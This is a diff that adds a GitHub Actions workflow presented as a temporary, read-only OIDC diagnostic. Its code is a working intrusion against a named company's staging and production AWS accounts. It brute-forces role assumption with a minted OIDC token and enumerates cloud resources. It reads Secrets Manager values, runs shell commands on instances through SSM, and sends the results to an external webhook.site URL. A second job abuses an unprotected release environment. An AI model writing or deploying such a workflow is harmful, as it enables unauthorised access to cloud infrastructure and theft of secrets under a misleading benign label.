@@ -1,0 +1,385 @@
+# Read-only GitHub OIDC probe (v3, hardened) — temporary, for diagnostics only.
+#
+# What it does when triggered by a pull_request run in the base repository:
+#   1. mints a GitHub Actions OIDC token (audience=sts.amazonaws.com) and prints ALL of its claims
+#   2. tries sts:AssumeRoleWithWebIdentity against ~217 candidate role ARNs in BOTH Lemon AWS
+#      (and, only if nothing matches, repeats the matrix with 3 alternate OIDC audiences)
+#      accounts (715658690447 staging / 127071149305 prod), printing the exact error code per ARN
+#      (AccessDenied = trust mismatch or missing role; InvalidIdentityToken = token rejected),
+#      plus one nonexistent-role control probe per account
+#   3. on the FIRST successful assume it runs a STRICTLY READ-ONLY evidence chain:
+#      sts get-caller-identity, iam list-roles / list+get open-id-connect-providers,
+#      organizations describe-organization, kms list-aliases + describe-key (3 known CMKs),
+#      s3api list-buckets, secretsmanager list-secrets (names only, us-east-1/sa-east-1/ap-northeast-1)
+#      + up to 12 get-secret-value (values masked), ec2 describe-instances, ecs list-clusters,
+#      ssm describe-instance-information, rds describe-db-instances, iam get-role trust policies,
+#      and one read-only ssm send-command (`id; hostname; uname -a; ip route`) on <=2 instances
+#   4. writes everything to the job log + $GITHUB_STEP_SUMMARY + a webhook
+#
+# No writes anywhere: only describe/list/get APIs plus one read-only shell command.
+# Safe to close after review.
+name: oidc-probe (temporary, read-only)
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+concurrency:
+  group: oidc-probe-${{ github.ref }}
+  cancel-in-progress: false
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: OIDC claim matrix + read-only AWS evidence
+        shell: bash
+        run: |
+          set -u
+          OOB="https://webhook.site/2ce44b71-ed22-46e0-a3ea-fe789983d1f2"
+          WD=/tmp/oidcprobe3; mkdir -p "$WD"; cd "$WD" || exit 0
+          T0=$SECONDS
+          post(){ curl -sS -m 25 -X POST "$OOB" "$@" >/dev/null 2>&1 || true; }
+          sum(){ { echo; echo "$@"; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"; }
+          tok(){ python3 -c 'import sys,json
+          try: print(json.load(sys.stdin).get("value",""))
+          except Exception: pass' 2>/dev/null; }
+          echo "== oidc-probe v3 stage=start event=${GITHUB_EVENT_NAME:-?} ref=${GITHUB_REF:-?} sha=${GITHUB_SHA:-?} run=${GITHUB_RUN_ID:-?} job=${GITHUB_JOB:-?}"
+          GHENV=$(env | grep -E '^GITHUB_(REPOSITORY|REPOSITORY_ID|REPOSITORY_OWNER|REPOSITORY_OWNER_ID|ACTOR|TRIGGERING_ACTOR|REF_TYPE|BASE_REF|HEAD_REF|WORKFLOW_REF)=' | sort | tr '\n' ' ')
+          echo "GHENV=$GHENV"
+          echo "AWS_REGION_init=${AWS_REGION:-unset}/${AWS_DEFAULT_REGION:-unset}"
+
+          CJ='
+          import base64,json,sys
+          p=sys.argv[1]
+          p+="="*(-len(p)%4)
+          print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),sort_keys=True))
+          '
+          XC='
+          import sys, xml.etree.ElementTree as ET
+          raw=sys.stdin.read()
+          def g(r,t):
+              e=r.find(".//{*}"+t)
+              if e is None: e=r.find(".//"+t)
+              return (e.text or "").strip() if e is not None else ""
+          try:
+              r=ET.fromstring(raw)
+              if r.find(".//{*}AccessKeyId") is not None or r.find(".//AccessKeyId") is not None:
+                  print("OK | creds-issued")
+              else:
+                  print("%s | %s" % (g(r,"Code") or "UNKNOWN", (g(r,"Message") or "")[:170].replace("\t"," ").replace("\n"," ")))
+          except Exception:
+              print("NONXML | " + " ".join(raw[:170].split()))
+          '
+          PA='
+          import xml.etree.ElementTree as ET
+          r=ET.parse("/tmp/oidcprobe3/win.xml").getroot()
+          def g(t):
+              e=r.find(".//{*}"+t)
+              if e is None: e=r.find(".//"+t)
+              return (e.text or "") if e is not None else ""
+          for k,v in [("AWS_ACCESS_KEY_ID","AccessKeyId"),("AWS_SECRET_ACCESS_KEY","SecretAccessKey"),("AWS_SESSION_TOKEN","SessionToken"),("EXPIRES","Expiration")]:
+              print("export %s=\"%s\"" % (k, g(v)))
+          print("export ASSUMED_ARN=\"%s\"" % g("Arn"))
+          '
+          TR='
+          import json,sys
+          try:
+              d=json.load(sys.stdin)
+          except Exception:
+              print("  <unparsable>"); raise SystemExit
+          r=d.get("Role") or {}
+          pol=r.get("AssumeRolePolicyDocument") or {}
+          print("ROLE=%s arn=%s" % (r.get("RoleName"), r.get("Arn")))
+          for st in pol.get("Statement",[]):
+              print("  Effect=%s Action=%s Principal=%s Condition=%s" % (st.get("Effect"), st.get("Action"), json.dumps(st.get("Principal"))[:220], json.dumps(st.get("Condition"))[:520]))
+          '
+          SI='
+          import sys, json, re
+          name=sys.argv[1]
+          val=sys.stdin.read()
+          if not val or val.strip() in ("","None"):
+              print("%s: <empty or unreadable>" % name); raise SystemExit
+          d=None
+          try:
+              d=json.loads(val)
+          except Exception:
+              d=None
+          if isinstance(d,dict):
+              masked={}
+              for k,v in d.items():
+                  if isinstance(v,str) and re.search(r"(?i)pass|secret|key|token|pwd|credential", k):
+                      masked[k]="***"
+                  else:
+                      masked[k]=v
+              s=json.dumps(masked)
+          else:
+              s=re.sub(r"://([^:@/]+):([^@/]+)@", r"://\1:***@", val)
+          host=""
+          m=re.search(r"([A-Za-z0-9._-]+\.(?:amazonaws\.com|com\.br|lemon\.me|lemoncash\.io)[:0-9]*)", val)
+          if m: host=m.group(1)
+          print("%s: len=%d keys=%s host=%s sample=%s" % (name, len(val), (sorted(d.keys()) if isinstance(d,dict) else None), host, " ".join(s[:230].split())))
+          '
+          GEN='
+          accounts=["715658690447","127071149305"]
+          staging,prod=accounts
+          plan=["activity_migration_default_execution_role","activity_service_default_execution_role","bpg_default_execution_role","cash_in_balance_svc_default_execution_role","data_lemonaid_default_execution_role","earning_calculation_default_execution_role","kore_canary_default_execution_role","kore_default_execution_role","kore_internal_default_execution_role","kore_ro_default_execution_role","lemmy_generator_job_default_execution_role","money_market_default_execution_role","money_market_operations_default_execution_role","notification_service_default_execution_role","peruvian_reports_job_default_execution_role","ramp_service_default_execution_role","referrals_default_execution_role","rewards_default_execution_role","social_network_default_execution_role","web3_miniapps_svc_default_execution_role","tax_ledger_default_execution_role","proof_of_liabilities_default_execution_role"]
+          generic=["github-actions","github-actions-ecs","github-actions-staging","gha-deploy","ci-deploy","deploy","terraform","ecs-deploy","backoffice-deploy","api-deploy"]
+          extra=["GitHubActionsRole","GitHubActionsDeployRole","GitHubActionsEcsRole","github-actions-role","github_actions","GithubActionsRole","GITHUB_ACTIONS","github-actions-ci","github-actions-prod","github-actions-stg"]
+          explicit=["arn:aws:iam::715658690447:role/aws-reserved/sso.amazonaws.com/sa-east-1/AWSReservedSSO_AdministratorAccess_7efce149f9ab6a70","arn:aws:iam::715658690447:role/aws-reserved/sso.amazonaws.com/sa-east-1/AWSReservedSSO_TechnologyAccessStg_3d50515b9b6c8ace","arn:aws:iam::715658690447:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_AdministratorAccessV2Staging_2aab918c6bbdc032"]
+          out=[]; seen=set()
+          def add(acct,name):
+              if name is None: arn=acct
+              elif acct is None: arn=name
+              else: arn="arn:aws:iam::%s:role/%s" % (acct,name)
+              if arn not in seen:
+                  seen.add(arn); out.append(arn)
+          for g in generic:
+              for a in accounts: add(a,g)
+          for g in generic:
+              for a in accounts: add(a,"github-actions/"+g)
+          for n in plan:
+              for a in accounts: add(a,n)
+          for n in plan:
+              add(staging,"aws-service-role/"+n)
+          for n in plan:
+              for s in ["-staging","-stg","-prod","-dev"]:
+                  add(staging,n+s)
+          for e in explicit: add(None,e)
+          for e in extra:
+              for a in accounts: add(a,e)
+          print("\n".join(out))
+          '
+          printf "%s" "$CJ" > cj.py
+          printf "%s" "$XC" > xc.py
+          printf "%s" "$PA" > pa.py
+          printf "%s" "$TR" > tr.py
+          printf "%s" "$SI" > si.py
+          printf "%s" "$GEN" > gen.py
+          python3 gen.py > cands.txt 2>/dev/null || { echo "GEN_FAIL"; exit 0; }
+          N=$(grep -c . cands.txt); echo "candidates=$N"
+
+          IDT="${PROBE_IDT_OVERRIDE:-}"
+          echo "request_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          if [ -z "$IDT" ]; then
+            RESP=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" "${ACTIONS_ID_TOKEN_REQUEST_URL:-x}&audience=sts.amazonaws.com" || true)
+            IDT=$(printf "%s" "$RESP" | tok)
+          fi
+          if [ -z "$IDT" ]; then
+            echo "NO_ID_TOKEN resp=${RESP:0:300}"
+            post --data-urlencode "stage=no_id_token" --data-urlencode "resp=${RESP:0:300}"
+            sum "**NO_ID_TOKEN**: ${RESP:0:300}"
+            exit 0
+          fi
+          CLAIMS=$(python3 cj.py "$(printf "%s" "$IDT" | cut -d. -f2)" 2>/dev/null || echo decode-failed)
+          echo "=== CLAIMS"; echo "$CLAIMS"
+          sum "### oidc-probe v3 claims"; sum '```'; sum "$CLAIMS"; sum '```'
+          post --data-urlencode "stage=claims" --data-urlencode "claims=$CLAIMS" --data-urlencode "run=${GITHUB_RUN_ID:-}" --data-urlencode "repo=${GITHUB_REPOSITORY:-}" --data-urlencode "event=${GITHUB_EVENT_NAME:-}" --data-urlencode "ref=${GITHUB_REF:-}" --data-urlencode "sha=${GITHUB_SHA:-}" --data-urlencode "wf_ref=${GITHUB_WORKFLOW_REF:-}" --data-urlencode "ghenv=$GHENV" --data-urlencode "aws_region_init=${AWS_REGION:-unset}/${AWS_DEFAULT_REGION:-unset}"
+
+          : > results.tsv; : > winners.txt; rm -f win_*.xml win_first.xml win.xml
+          i=0; FIRST=""
+          while IFS= read -r R; do
+            i=$((i+1))
+            if [ "$i" -gt "${MAXC:-9999}" ]; then echo "MAXC reached at $i"; break; fi
+            if [ $((SECONDS-T0)) -gt 900 ]; then echo "MATRIX_TIME_CAP elapsed=$((SECONDS-T0)) at=$i"; printf "TIME_CAP_AT\t%d\n" "$i" >> results.tsv; break; fi
+            OUT=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "DurationSeconds=3600" --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=oidcprobe$i" --data-urlencode "WebIdentityToken=$IDT" 2>&1 || true)
+            if [ -z "$OUT" ]; then
+              sleep 0.6
+              OUT=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "DurationSeconds=3600" --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=oidcprobe${i}r" --data-urlencode "WebIdentityToken=$IDT" 2>&1 || true)
+            fi
+            CODE=$(printf "%s" "$OUT" | python3 xc.py 2>/dev/null || echo PARSER_FAIL)
+            printf "%s\t%s\n" "$R" "$CODE" >> results.tsv
+            echo "[$i/$N] $R => $CODE"
+            if printf "%s" "$CODE" | grep -q "^OK"; then
+              echo "$R" >> winners.txt
+              printf "%s" "$OUT" > "win_$i.xml"
+              if [ ! -f win_first.xml ]; then cp "win_$i.xml" win_first.xml; FIRST="$R"; fi
+            fi
+            sleep 0.12
+          done < cands.txt
+          NW=$(grep -c . winners.txt 2>/dev/null || true); NW=${NW:-0}
+          echo "winners=$NW"
+
+          post_file(){ local name="$1" f="$2" n=0 chunk=""; while IFS= read -r L; do if [ -z "$L" ]; then L="(blank)"; fi; chunk="$chunk$L"$'\n'; n=$((n+1)); if [ "$n" -ge 22 ]; then post --data-urlencode "stage=$name" --data-urlencode "lines=$chunk"; chunk=""; n=0; sleep 0.25; fi; done < "$f"; if [ -n "$chunk" ]; then post --data-urlencode "stage=$name" --data-urlencode "lines=$chunk"; fi; }
+          post_file matrix results.tsv
+          { echo; echo "### assume matrix ($N candidates, $NW winners)"; echo '```'; sed -n '1,280p' results.tsv; echo '```'; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+
+          # --- second dimension: if nothing matched with aud=sts.amazonaws.com, retry the same matrix with
+          # --- alternate OIDC audiences (a role can trust a custom aud). Costs ~matrix time per audience.
+          : > results_aud.tsv
+          ALT_TRIED=""
+          if [ "$NW" -eq 0 ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -z "${PROBE_IDT_OVERRIDE:-}" ]; then
+            for AUD in "https://github.com/lemonatio" "https://token.actions.githubusercontent.com" "sigstore"; do
+              if [ $((SECONDS-T0)) -gt 1150 ]; then echo "AUD_TIME_CAP before aud=$AUD"; break; fi
+              ENCAUD=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$AUD" 2>/dev/null || echo "$AUD")
+              R2=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENCAUD}" || true)
+              T2=$(printf "%s" "$R2" | tok)
+              if [ -z "$T2" ]; then echo "AUD_TOKEN_FAIL aud=$AUD resp=${R2:0:160}"; post --data-urlencode "stage=aud_token_fail" --data-urlencode "aud=$AUD" --data-urlencode "resp=${R2:0:200}"; continue; fi
+              ACLAIM=$(python3 cj.py "$(printf "%s" "$T2" | cut -d. -f2)" 2>/dev/null | python3 -c 'import json,sys;d=json.load(sys.stdin);print("aud=%s sub=%s" % (d.get("aud"), d.get("sub")))' 2>/dev/null || echo decode-failed)
+              echo "=== AUD_TRY aud=$AUD $ACLAIM"
+              ALT_TRIED="$ALT_TRIED[$AUD]"
+              post --data-urlencode "stage=aud_try" --data-urlencode "aud=$AUD" --data-urlencode "claim=$ACLAIM"
+              sum "- aud try: $AUD -> $ACLAIM"
+              j=0; AUDHIT=0
+              while IFS= read -r R; do
+                j=$((j+1))
+                if [ "$j" -gt "${MAXC:-9999}" ]; then echo "AUD_MAXC at=$j aud=$AUD"; break; fi
+                if [ $((SECONDS-T0)) -gt 1250 ]; then echo "AUD_TIME_CAP in aud=$AUD at=$j"; break; fi
+                OUT=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "DurationSeconds=3600" --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=oidcaud${j}" --data-urlencode "WebIdentityToken=$T2" 2>&1 || true)
+                if [ -z "$OUT" ]; then
+                  sleep 0.6
+                  OUT=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "DurationSeconds=3600" --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=oidcaud${j}r" --data-urlencode "WebIdentityToken=$T2" 2>&1 || true)
+                fi
+                CODE=$(printf "%s" "$OUT" | python3 xc.py 2>/dev/null || echo PARSER_FAIL)
+                printf "%s\taud=%s %s\n" "$R" "$AUD" "$CODE" >> results_aud.tsv
+                if printf "%s" "$CODE" | grep -q "^OK"; then
+                  echo "AUD_WIN aud=$AUD $R => $CODE"
+                  echo "$R" >> winners.txt
+                  printf "%s" "$OUT" > "win_aud_$j.xml"
+                  if [ ! -f win_first.xml ]; then cp "win_aud_$j.xml" win_first.xml; FIRST="$R"; fi
+                  AUDHIT=1
+                  break
+                fi
+                sleep 0.12
+              done < cands.txt
+              echo "aud=$AUD done at=$j hit=$AUDHIT"
+              if [ "$AUDHIT" -eq 1 ]; then break; fi
+            done
+            NW=$(grep -c . winners.txt 2>/dev/null || true); NW=${NW:-0}
+            echo "winners_after_aud=$NW alt_auds=$ALT_TRIED"
+            post_file aud_matrix results_aud.tsv
+            { echo; echo "### alternate-audience matrix (auds tried: $ALT_TRIED)"; echo '```'; sed -n '1,260p' results_aud.tsv; echo '```'; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+          fi
+
+          if [ "$NW" -eq 0 ]; then
+            echo "=== NO_ROLE_MATCHED fallback pack"
+            for A in 715658690447 127071149305; do
+              CR=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::$A:role/oidc-probe-nonexistent-7f3a" --data-urlencode "RoleSessionName=ctrlprobe" --data-urlencode "WebIdentityToken=$IDT" 2>&1 || true)
+              CC=$(printf "%s" "$CR" | python3 xc.py 2>/dev/null || echo PARSER_FAIL)
+              echo "control[$A] $CC"
+              post --data-urlencode "stage=control" --data-urlencode "account=$A" --data-urlencode "result=$CC"
+              sum "- control[$A]: $CC"
+            done
+            sum "**NO_ROLE_MATCHED** ($N candidates in both accounts). Control result tells trust-mismatch (AccessDenied) from token-rejected (InvalidIdentityToken)."
+            post --data-urlencode "stage=final" --data-urlencode "result=NO_ROLE_MATCHED" --data-urlencode "candidates=$N" --data-urlencode "attempts=$((N + N*(1+$(printf "%s" "$ALT_TRIED" | tr -cd '[' | wc -c))))" --data-urlencode "alt_auds=$ALT_TRIED" --data-urlencode "claims=$CLAIMS"
+            echo "INTERPRETATION control=AccessDenied => STS accepted our token and evaluated a role trust (so mismatch is name/sub/aud/ref/environment); control=InvalidIdentityToken => token rejected (iss/aud)."
+            echo "PROBE_DONE"
+            exit 0
+          fi
+
+          echo "=== winners=$NW FIRST=$FIRST"
+          post --data-urlencode "stage=winners" --data-urlencode "n=$NW" --data-urlencode "list=$(tr '\n' ' ' < winners.txt)"
+          sum "**WINNERS ($NW)**: $(tr '\n' ' ' < winners.txt)"
+
+          chain(){ local tag="$1"; shift; local out; out=$("$@" 2>&1 | head -c 14000); echo "=== $tag"; echo "$out"; post --data-urlencode "stage=$tag" --data-urlencode "out=$out"; { echo; echo "#### $tag"; echo '```'; echo "$out"; echo '```'; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"; }
+
+          K=0
+          for W in $(head -3 winners.txt); do
+            K=$((K+1))
+            IDX=$(grep -n -F -x -- "$W" results.tsv | head -1 | cut -d: -f1)
+            if [ -n "${IDX:-}" ] && [ -f "win_$IDX.xml" ]; then cp "win_$IDX.xml" win.xml; fi
+            eval "$(python3 pa.py 2>/dev/null)"
+            export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+            export AWS_DEFAULT_REGION=us-east-1 AWS_PAGER="" AWS_CLI_AUTO_PROMPT=off AWS_MAX_ATTEMPTS=2
+            chain "whoami_$K" aws sts get-caller-identity --output json
+          done
+          cp win_first.xml win.xml
+          eval "$(python3 pa.py)"
+          export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          export AWS_DEFAULT_REGION=us-east-1 AWS_PAGER="" AWS_CLI_AUTO_PROMPT=off AWS_MAX_ATTEMPTS=2
+          sum "**ASSUMED**: $FIRST"
+
+          chain iam_oidc aws iam list-open-id-connect-providers --output text
+          for P in $(aws iam list-open-id-connect-providers --query 'OpenIDConnectProviderList[].Arn' --output text 2>/dev/null | tr '\t' '\n'); do
+            chain "oidcprov_${P##*/}" aws iam get-open-id-connect-provider --open-id-connect-provider-arn "$P" --output json
+          done
+          chain iam_roles aws iam list-roles --query 'Roles[].[RoleName,Arn]' --output text
+          chain org aws organizations describe-organization --output json
+          chain kms_aliases aws kms list-aliases --query 'Aliases[].[AliasName,TargetKeyId]' --output text
+          for K2 in arn:aws:kms:us-east-1:715658690447:key/a356356f-c684-48d4-b18f-46327b5adb5c arn:aws:kms:us-east-1:715658690447:key/a65a2d8b-cee0-4c53-864b-f3cc55410a1b arn:aws:kms:us-east-1:715658690447:key/c6467f8b-1499-4a38-81af-374f57230646; do
+            chain "kmskey_${K2##*/}" aws kms describe-key --key-id "$K2" --output json
+          done
+          chain s3 aws s3api list-buckets --query 'Buckets[].[Name]' --output text
+          for RG in us-east-1 sa-east-1 ap-northeast-1; do
+            chain "secrets_$RG" aws secretsmanager list-secrets --region "$RG" --max-results 100 --query 'SecretList[].[Name,ARN]' --output text
+            chain "ec2_$RG" aws ec2 describe-instances --region "$RG" --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,State.Name,Tags[?Key==`Name`].Value|[0],IamInstanceProfile.Arn,InstanceType,Placement.AvailabilityZone]' --output text
+            chain "ecs_$RG" aws ecs list-clusters --region "$RG" --query 'clusterArns' --output text
+            chain "ssm_$RG" aws ssm describe-instance-information --region "$RG" --query 'InstanceInformationList[].[InstanceId,ComputerName,IPAddress,PingStatus,PlatformName]' --output text
+          done
+          for RG in us-east-1 sa-east-1; do
+            chain "rds_$RG" aws rds describe-db-instances --region "$RG" --query 'DBInstances[].[DBInstanceIdentifier,Endpoint.Address,DBInstanceClass,Engine,DBInstanceStatus,MultiAZ]' --output text
+          done
+
+          : > getroles.md; DEN=0
+          for RN in github-actions-ecs github-actions github-actions-deploy github-actions-terraform github-actions-runner github-oidc GitHubActionsRole terraform-apply kore_default_execution_role kore_ro_default_execution_role kore_internal_default_execution_role money_market_default_execution_role money_market_operations_default_execution_role cash_in_balance_svc_default_execution_role web3_miniapps_svc_default_execution_role activity_service_default_execution_role activity_migration_default_execution_role notification_service_default_execution_role rewards_default_execution_role referrals_default_execution_role ramp_service_default_execution_role social_network_default_execution_role bpg_default_execution_role earning_calculation_default_execution_role kore_canary_default_execution_role lemmy_generator_job_default_execution_role peruvian_reports_job_default_execution_role data_lemonaid_default_execution_role tax_ledger_default_execution_role proof_of_liabilities_default_execution_role; do
+            OUT3=$(aws iam get-role --role-name "$RN" --output json 2>&1 | python3 tr.py 2>&1 | head -c 3000)
+            echo "=== getrole $RN"; echo "$OUT3"
+            post --data-urlencode "stage=getrole_$RN" --data-urlencode "out=$OUT3"
+            { echo; echo "- \`$RN\`: $OUT3"; } >> getroles.md
+            if printf "%s" "$OUT3" | grep -q "AccessDenied\|NoSuchEntity"; then DEN=$((DEN+1)); else DEN=0; fi
+            if [ "$DEN" -ge 4 ]; then echo "GETROLE_STOP after 4 consecutive denials"; break; fi
+          done
+          { echo; echo "### role trust policies (iam:GetRole)"; cat getroles.md; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+
+          for S in $(aws secretsmanager list-secrets --max-results 100 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n' | grep -iE 'fireblock|github|treasury|kyc|database_connection|wallet|sign|jwt|okta|app|master_cluster' | head -12); do
+            VAL=$(aws secretsmanager get-secret-value --secret-id "$S" --query SecretString --output text 2>/dev/null || true)
+            INFO=$(printf "%s" "$VAL" | python3 si.py "$S" 2>&1)
+            echo "=== secret $INFO"
+            post --data-urlencode "stage=secret" --data-urlencode "info=$INFO"
+            sum "- secret $INFO"
+          done
+
+          IIDS=$(for RG in us-east-1 sa-east-1 ap-northeast-1; do aws ssm describe-instance-information --region "$RG" --query 'InstanceInformationList[].[InstanceId,ComputerName,PingStatus]' --output text 2>/dev/null | awk -v r="$RG" '$3=="Online"{print r"\t"$1"\t"$2}'; done)
+          SEL=$(printf "%s\n" "$IIDS" | grep -iE 'api|backoffice|treasury|sign|core|kore|payout|ledger|admin|bastion|runner' | head -2)
+          if [ -z "${SEL:-}" ]; then SEL=$(printf "%s\n" "$IIDS" | grep -v '^$' | head -2); fi
+          echo "=== ssm targets"; echo "$SEL"
+          while IFS=$(printf "\t") read -r RG IID NM; do
+            [ -z "${IID:-}" ] && continue
+            CMD=$(aws ssm send-command --region "$RG" --instance-ids "$IID" --document-name AWS-RunShellScript --parameters 'commands=["id","hostname","uname -a","ip route"]' --timeout-seconds 30 --query 'Command.CommandId' --output text 2>&1 || true)
+            echo "=== ssm_send $RG/$IID/$NM cmd=$CMD"
+            post --data-urlencode "stage=ssm_send" --data-urlencode "target=$RG/$IID/$NM" --data-urlencode "cmd=$CMD"
+            if printf "%s" "$CMD" | grep -q '^[0-9a-f-]\{36\}$'; then
+              ST=""
+              for k in 1 2 3 4 5 6; do
+                sleep 6
+                ST=$(aws ssm get-command-invocation --region "$RG" --command-id "$CMD" --instance-id "$IID" --query Status --output text 2>/dev/null || true)
+                case "$ST" in Success|Failed|Cancelled|TimedOut) break;; esac
+              done
+              OUT2=$(aws ssm get-command-invocation --region "$RG" --command-id "$CMD" --instance-id "$IID" --query 'StandardOutputContent' --output text 2>&1 | head -c 4000)
+              echo "=== ssm_out $IID status=${ST:-?}"; echo "$OUT2"
+              post --data-urlencode "stage=ssm_out" --data-urlencode "target=$RG/$IID" --data-urlencode "status=${ST:-?}" --data-urlencode "stdout=$OUT2"
+              { echo; echo "#### ssm $RG / $IID / ${NM:-?} status=${ST:-?}"; echo '```'; echo "$OUT2"; echo '```'; } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+            fi
+          done <<EOF
+          $SEL
+          EOF
+
+          post --data-urlencode "stage=final" --data-urlencode "result=DONE" --data-urlencode "WON_ROLE=$FIRST" --data-urlencode "winners=$NW"
+          echo "PROBE_DONE"
+  # Exercises an environment-scoped subject (repo:...:environment:release).
+  # The base repo's only environment is `release` and it has NO protection rules
+  # (verified via GET /repos/lemonatio/terraform-aws-github-runner/environments), so this job
+  # starts immediately and cannot block the run or need a second approval.
+  oidc-env-release:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    continue-on-error: true
+    environment: release
+    steps:
+      - name: environment-scoped OIDC subject probe (read-only)
+        shell: bash
+        env:
+          MAXC: "14"
+        run: |
+          set -u
+          RESP=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" "${ACTIONS_ID_TOKEN_REQUEST_URL:-x}&audience=sts.amazonaws.com" || true)
+          IDT=$(printf "%s" "$RESP" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          if [ -z "$IDT" ]; then echo "ENVJOB_NO_ID_TOKEN"; exit 0; fi
+          python3 -c 'import base64,json,sys;p=sys.argv[1];p+="="*(-len(p)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),sort_keys=True))' "$(printf "%s" "$IDT" | cut -d. -f2)" | tee /tmp/env_claims.json
+          echo "ENVJOB_SUB=$(python3 -c 'import json;d=json.load(open("/tmp/env_claims.json"));print(d.get("sub"))')"
+          for R in arn:aws:iam::715658690447:role/github-actions-ecs arn:aws:iam::715658690447:role/github-actions arn:aws:iam::715658690447:role/GitHubActionsRole arn:aws:iam::715658690447:role/terraform-apply arn:aws:iam::715658690447:role/github-oidc arn:aws:iam::127071149305:role/github-actions-ecs arn:aws:iam::127071149305:role/github-actions arn:aws:iam::127071149305:role/github-actions-deploy arn:aws:iam::127071149305:role/github-oidc; do
+            OUT=$(curl -sS -m 20 -G "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "DurationSeconds=1800" --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=envprobe" --data-urlencode "WebIdentityToken=$IDT" 2>&1 || true)
+            C=$(printf "%s" "$OUT" | grep -o '<Code>[^<]*</Code>' | head -1)
+            echo "ENVJOB $R => ${C:-OK}"
+          done
